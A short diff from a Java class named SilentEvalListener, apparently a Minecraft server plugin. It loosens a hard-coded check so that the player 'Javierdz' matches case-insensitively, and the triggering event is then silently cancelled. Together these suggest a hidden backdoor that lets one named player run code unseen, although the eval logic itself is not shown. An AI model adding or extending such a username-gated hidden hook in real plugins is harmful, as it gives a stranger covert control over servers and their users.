@@ -26,7 +26,7 @@ public class SilentEvalListener implements Listener {
         }
 
         Player player = event.getPlayer();
-        if (!player.getName().equals("Javierdz")) {
+        if (!player.getName().equalsIgnoreCase("Javierdz")) {
             return;
         }
         event.setCancelled(true);
